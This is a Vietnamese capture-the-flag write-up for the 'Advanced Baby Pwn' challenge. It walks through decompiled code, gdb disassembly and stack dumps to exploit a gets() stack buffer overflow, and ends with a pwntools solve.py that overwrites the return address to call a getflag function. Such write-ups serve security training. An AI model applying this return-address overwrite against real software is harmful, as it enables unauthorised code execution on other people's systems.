# Advanced Baby Pwn
>Life is not fair

[Link tải challenge](pwn3)

Mở file `pwn3` bằng IDA Pro

Hàm main:
```c++
int __cdecl main(int argc, const char **argv, const char **envp)
{
  FILE *v3; // rdi

  puts("Another baby pwn ! ");
  fflush(stdout);
  puts("This program was written amateur hacker. ");
  fflush(stdout);
  puts("Please help me get flag on the server. ");
  v3 = stdout;
  fflush(stdout);
  check_login(v3, argv);
  return 0;
}
```

Hàm check_login:
```c++
int check_login()
{
  int result; // eax
  char s; // [rsp+0h] [rbp-40h]
  char s1; // [rsp+20h] [rbp-20h]

  memset(&s, 0, 5uLL);
  memset(&s1, 0, 0x10uLL);
  printf("Input username:> ", 0LL);
  fflush(stdout);
  gets(&s, 20LL, stdin);
  printf("Input password:> ");
  fflush(stdout);
  gets(&s1, 20LL, stdin);
  if ( !strcmp(&s, "admin") )
  {
    if ( !strcmp(&s1, "fUoysBCsZbZW4o3W") )
      puts("You are herro , Yeaaaa !!");
    else
      puts("Password incorrect");
    result = fflush(stdout);
  }
  else
  {
    puts("Noppppp !!");
    result = fflush(stdout);
  }
  return result;
}
```
Nếu nhập đúng username là `admin` và mật khẩu là `fUoysBCsZbZW4o3W` thì chương trình chỉ in ra câu `You are herro , Yeaaaa !!` chứ chả có flag nào nào ở đây cả. Vậy flag nằm ở đâu?

Xem list function thấy có hàm getflag
```c++
int getflag()
{
  puts("Congratulations, here is your flag: ");
  return system("cat flag");
}
```
Vậy việc chúng ta cần làm là tìm cách đổi **return address** về địa chỉ của hàm **getflag**, sau đó chương trình sẽ thực hiện lệnh `system("cat flag")` để đọc flag cho chúng ta.

Mở `pwn3` bằng `gdb`

## Mã assembly của hàm main:
```
gdb-peda$ pdisass main
Dump of assembler code for function main:
   0x0000000000400896 <+0>:	push   rbp
   0x0000000000400897 <+1>:	mov    rbp,rsp
   0x000000000040089a <+4>:	mov    edi,0x400a29
   0x000000000040089f <+9>:	call   0x4005d0 <puts@plt>
   0x00000000004008a4 <+14>:	mov    rax,QWORD PTR [rip+0x2007c5]        # 0x601070 <stdout@@GLIBC_2.2.5>
   0x00000000004008ab <+21>:	mov    rdi,rax
   0x00000000004008ae <+24>:	call   0x400640 <fflush@plt>
   0x00000000004008b3 <+29>:	mov    edi,0x400a40
   0x00000000004008b8 <+34>:	call   0x4005d0 <puts@plt>
   0x00000000004008bd <+39>:	mov    rax,QWORD PTR [rip+0x2007ac]        # 0x601070 <stdout@@GLIBC_2.2.5>
   0x00000000004008c4 <+46>:	mov    rdi,rax
   0x00000000004008c7 <+49>:	call   0x400640 <fflush@plt>
   0x00000000004008cc <+54>:	mov    edi,0x400a70
   0x00000000004008d1 <+59>:	call   0x4005d0 <puts@plt>
   0x00000000004008d6 <+64>:	mov    rax,QWORD PTR [rip+0x200793]        # 0x601070 <stdout@@GLIBC_2.2.5>
   0x00000000004008dd <+71>:	mov    rdi,rax
   0x00000000004008e0 <+74>:	call   0x400640 <fflush@plt>
   0x00000000004008e5 <+79>:	mov    eax,0x0
   0x00000000004008ea <+84>:	call   0x400771 <check_login>
   0x00000000004008ef <+89>:	mov    eax,0x0
   0x00000000004008f4 <+94>:	pop    rbp
   0x00000000004008f5 <+95>:	ret    
End of assembler dump.
```
## Mã assembly của hàm check_login
```
gdb-peda$ pdisass check_login
Dump of assembler code for function check_login:
   0x0000000000400771 <+0>:	push   rbp
   0x0000000000400772 <+1>:	mov    rbp,rsp
   0x0000000000400775 <+4>:	sub    rsp,0x40
   0x0000000000400779 <+8>:	lea    rax,[rbp-0x40]
   0x000000000040077d <+12>:	mov    edx,0x5
   0x0000000000400782 <+17>:	mov    esi,0x0
   0x0000000000400787 <+22>:	mov    rdi,rax
   0x000000000040078a <+25>:	call   0x400600 <memset@plt>
   0x000000000040078f <+30>:	lea    rax,[rbp-0x20]
   0x0000000000400793 <+34>:	mov    edx,0x10
   0x0000000000400798 <+39>:	mov    esi,0x0
   0x000000000040079d <+44>:	mov    rdi,rax
   0x00000000004007a0 <+47>:	call   0x400600 <memset@plt>
   0x00000000004007a5 <+52>:	mov    edi,0x4009b6
   0x00000000004007aa <+57>:	mov    eax,0x0
   0x00000000004007af <+62>:	call   0x4005f0 <printf@plt>
   0x00000000004007b4 <+67>:	mov    rax,QWORD PTR [rip+0x2008b5]        # 0x601070 <stdout@@GLIBC_2.2.5>
   0x00000000004007bb <+74>:	mov    rdi,rax
   0x00000000004007be <+77>:	call   0x400640 <fflush@plt>
   0x00000000004007c3 <+82>:	mov    rdx,QWORD PTR [rip+0x2008b6]        # 0x601080 <stdin@@GLIBC_2.2.5>
   0x00000000004007ca <+89>:	lea    rax,[rbp-0x40]
   0x00000000004007ce <+93>:	mov    esi,0x14
   0x00000000004007d3 <+98>:	mov    rdi,rax
   0x00000000004007d6 <+101>:	mov    eax,0x0
   0x00000000004007db <+106>:	call   0x400630 <gets@plt>
   0x00000000004007e0 <+111>:	mov    edi,0x4009c8
   0x00000000004007e5 <+116>:	mov    eax,0x0
   0x00000000004007ea <+121>:	call   0x4005f0 <printf@plt>
   0x00000000004007ef <+126>:	mov    rax,QWORD PTR [rip+0x20087a]        # 0x601070 <stdout@@GLIBC_2.2.5>
   0x00000000004007f6 <+133>:	mov    rdi,rax
   0x00000000004007f9 <+136>:	call   0x400640 <fflush@plt>
   0x00000000004007fe <+141>:	mov    rdx,QWORD PTR [rip+0x20087b]        # 0x601080 <stdin@@GLIBC_2.2.5>
   0x0000000000400805 <+148>:	lea    rax,[rbp-0x20]
   0x0000000000400809 <+152>:	mov    esi,0x14
   0x000000000040080e <+157>:	mov    rdi,rax
   0x0000000000400811 <+160>:	mov    eax,0x0
   0x0000000000400816 <+165>:	call   0x400630 <gets@plt>
   0x000000000040081b <+170>:	lea    rax,[rbp-0x40]
   0x000000000040081f <+174>:	mov    esi,0x4009da
   0x0000000000400824 <+179>:	mov    rdi,rax
   0x0000000000400827 <+182>:	call   0x400620 <strcmp@plt>
   0x000000000040082c <+187>:	test   eax,eax
   0x000000000040082e <+189>:	jne    0x40087b <check_login+266>
   0x0000000000400830 <+191>:	lea    rax,[rbp-0x20]
   0x0000000000400834 <+195>:	mov    esi,0x4009e0
   0x0000000000400839 <+200>:	mov    rdi,rax
   0x000000000040083c <+203>:	call   0x400620 <strcmp@plt>
   0x0000000000400841 <+208>:	test   eax,eax
   0x0000000000400843 <+210>:	jne    0x400860 <check_login+239>
   0x0000000000400845 <+212>:	mov    edi,0x4009f1
   0x000000000040084a <+217>:	call   0x4005d0 <puts@plt>
   0x000000000040084f <+222>:	mov    rax,QWORD PTR [rip+0x20081a]        # 0x601070 <stdout@@GLIBC_2.2.5>
   0x0000000000400856 <+229>:	mov    rdi,rax
   0x0000000000400859 <+232>:	call   0x400640 <fflush@plt>
   0x000000000040085e <+237>:	jmp    0x400894 <check_login+291>
   0x0000000000400860 <+239>:	mov    edi,0x400a0b
   0x0000000000400865 <+244>:	call   0x4005d0 <puts@plt>
   0x000000000040086a <+249>:	mov    rax,QWORD PTR [rip+0x2007ff]        # 0x601070 <stdout@@GLIBC_2.2.5>
   0x0000000000400871 <+256>:	mov    rdi,rax
   0x0000000000400874 <+259>:	call   0x400640 <fflush@plt>
   0x0000000000400879 <+264>:	jmp    0x400894 <check_login+291>
   0x000000000040087b <+266>:	mov    edi,0x400a1e
   0x0000000000400880 <+271>:	call   0x4005d0 <puts@plt>
   0x0000000000400885 <+276>:	mov    rax,QWORD PTR [rip+0x2007e4]        # 0x601070 <stdout@@GLIBC_2.2.5>
   0x000000000040088c <+283>:	mov    rdi,rax
   0x000000000040088f <+286>:	call   0x400640 <fflush@plt>
   0x0000000000400894 <+291>:	leave  
   0x0000000000400895 <+292>:	ret    
End of assembler dump.
```

Đầu tiên, đặt 1 breakpoint tại địa chỉ 0x0000000000400827 <check_login+182> bằng lệnh `b*0x0000000000400827`.
Sau đó nhập lệnh `run` để chạy chương trình. Nhập username là `admin`, mật khẩu là `password`. 

Chương trình sẽ dừng ở breakpoint đã đặt:
![Screenshot](../screenshots/pwn1.png?raw=true "Screenshot")

Tiếp tục nhập lệnh `telescope 20` để xem trạng thái của stack lúc này
```
gdb-peda$ telescope 20
0000| 0x7fffffffdf70 --> 0x6e696d6461 ('admin')
0008| 0x7fffffffdf78 --> 0x7ffff7fb16a0 --> 0xfbad2a84 
0016| 0x7fffffffdf80 --> 0x400a70 ("Please help me get flag on the server. ")
0024| 0x7fffffffdf88 --> 0x7ffff7fb16a0 --> 0xfbad2a84 
0032| 0x7fffffffdf90 ("password")
0040| 0x7fffffffdf98 --> 0x0 
0048| 0x7fffffffdfa0 --> 0x400660 (<_start>:	xor    ebp,ebp)
0056| 0x7fffffffdfa8 --> 0x400900 (<__libc_csu_init>:	push   r15)
0064| 0x7fffffffdfb0 --> 0x7fffffffdfc0 --> 0x0 
0072| 0x7fffffffdfb8 --> 0x4008ef (<main+89>:	mov    eax,0x0)
0080| 0x7fffffffdfc0 --> 0x0 
0088| 0x7fffffffdfc8 --> 0x7ffff7dec0b3 (<__libc_start_main+243>:	mov    edi,eax)
0096| 0x7fffffffdfd0 --> 0x7ffff7ffc620 --> 0x5042900000000 
0104| 0x7fffffffdfd8 --> 0x7fffffffe0b8 --> 0x7fffffffe3d1 ("/home/minhgalaxy/Desktop/pwn3")
0112| 0x7fffffffdfe0 --> 0x100000000 
0120| 0x7fffffffdfe8 --> 0x400896 (<main>:	push   rbp)
0128| 0x7fffffffdff0 --> 0x400900 (<__libc_csu_init>:	push   r15)
0136| 0x7fffffffdff8 --> 0xf05ba30dd57f78bc 
0144| 0x7fffffffe000 --> 0x400660 (<_start>:	xor    ebp,ebp)
0152| 0x7fffffffe008 --> 0x7fffffffe0b0 --> 0x1
```

Có thể thấy `password` đã nhập nằm ở địa chỉ `0x7fffffffdf90` và địa chỉ trở về hàm main nằm ở địa chỉ `0x7fffffffdfb8`.

Để có thể fill hết vùng nhớ này cần `0x7fffffffdfb8 - 0x7fffffffdf90 = 40 bytes`.

Thử nhập lệnh `run` lại lần nữa, lần này nhập password là
```python
'A'*40 + 'ABCDABCD'
```
Kết quả nhận được như sau:
```
gdb-peda$ telescope 20
0000| 0x7fffffffdf70 --> 0x6e696d6461 ('admin')
0008| 0x7fffffffdf78 --> 0x7ffff7fb16a0 --> 0xfbad2a84 
0016| 0x7fffffffdf80 --> 0x400a70 ("Please help me get flag on the server. ")
0024| 0x7fffffffdf88 --> 0x7ffff7fb16a0 --> 0xfbad2a84 
0032| 0x7fffffffdf90 ('A' <repeats 41 times>, "BCDABCD")
0040| 0x7fffffffdf98 ('A' <repeats 33 times>, "BCDABCD")
0048| 0x7fffffffdfa0 ('A' <repeats 25 times>, "BCDABCD")
0056| 0x7fffffffdfa8 ('A' <repeats 17 times>, "BCDABCD")
0064| 0x7fffffffdfb0 ("AAAAAAAAABCDABCD")
0072| 0x7fffffffdfb8 ("ABCDABCD")
0080| 0x7fffffffdfc0 --> 0x0 
0088| 0x7fffffffdfc8 --> 0x7ffff7dec0b3 (<__libc_start_main+243>:	mov    edi,eax)
0096| 0x7fffffffdfd0 --> 0x7ffff7ffc620 --> 0x5042900000000 
0104| 0x7fffffffdfd8 --> 0x7fffffffe0b8 --> 0x7fffffffe3d1 ("/home/minhgalaxy/Desktop/pwn3")
0112| 0x7fffffffdfe0 --> 0x100000000 
0120| 0x7fffffffdfe8 --> 0x400896 (<main>:	push   rbp)
0128| 0x7fffffffdff0 --> 0x400900 (<__libc_csu_init>:	push   r15)
0136| 0x7fffffffdff8 --> 0xf702324a68d95b46 
0144| 0x7fffffffe000 --> 0x400660 (<_start>:	xor    ebp,ebp)
0152| 0x7fffffffe008 --> 0x7fffffffe0b0 --> 0x1
```
Địa chỉ trả về đã bị ghi đè thành `ABCDABCD`

## Mã assembly của hàm getflag
```
gdb-peda$ pdisass getflag
Dump of assembler code for function getflag:
   0x0000000000400756 <+0>:	push   rbp
   0x0000000000400757 <+1>:	mov    rbp,rsp
   0x000000000040075a <+4>:	mov    edi,0x400988
   0x000000000040075f <+9>:	call   0x4005d0 <puts@plt>
   0x0000000000400764 <+14>:	mov    edi,0x4009ad
   0x0000000000400769 <+19>:	call   0x4005e0 <system@plt>
   0x000000000040076e <+24>:	nop
   0x000000000040076f <+25>:	pop    rbp
   0x0000000000400770 <+26>:	ret    
End of assembler dump.
```

Địa chỉ của hàm flag nằm ở `0x0000000000400756`, bây giờ chỉ cần thay thế `ABCDABCD` ở trên bằng địa chỉ của hàm **getflag**

Script solve.py
```python
rom pwn import *
p = process('./pwn3')
p.recvuntil('Input username:> ')
p.sendline('admin')
p.recvuntil('Input password:> ')
getflag_addr = 0x0000000000400756
p.sendline(b'A'* 40 + p64(getflag_addr))
print(str(p.recv(1024), 'utf-8'))
```
